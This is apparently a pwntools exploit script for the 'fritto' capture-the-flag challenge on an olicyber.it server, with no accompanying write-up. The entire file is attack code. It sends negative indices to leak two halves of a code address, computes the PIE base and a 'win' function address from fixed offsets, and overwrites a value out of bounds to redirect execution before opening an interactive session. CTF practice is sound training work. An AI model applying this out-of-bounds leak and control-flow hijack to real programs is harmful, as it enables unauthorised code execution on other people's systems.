from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

from pwn import *

if args.REMOTE:
  r = remote("fritto-disordinato.challs.olicyber.it", 33001)
else:
  r = gdb.debug("./fritto", """
    b *main
    continue
  """)

r.recvuntil(b"> ")

r.sendline(b"1")
r.recvline()
r.sendline(b"-9")
r.recvuntil(b": ")


first_main_address = long_to_bytes(int(r.recvline()[:-1]))

r.sendline(b"1")
r.recvline()
r.sendline(b"-10")
r.recvuntil(b": ")

second_main_address = long_to_bytes(int(r.recvline()[:-1]) + (1<<32)) #two's complement 

main_address = bytes_to_long(first_main_address + second_main_address) - 241 #241 is the offset from the start of the main function

offset = main_address - 0x9690

win_address = offset + 0x99a0

print(hex(main_address), hex(offset), hex(win_address))
r.sendline(b"0")
r.recvline()
r.sendline(b"-10")
r.recvline()

r.sendline(str(win_address % 2**32).encode())
r.interactive()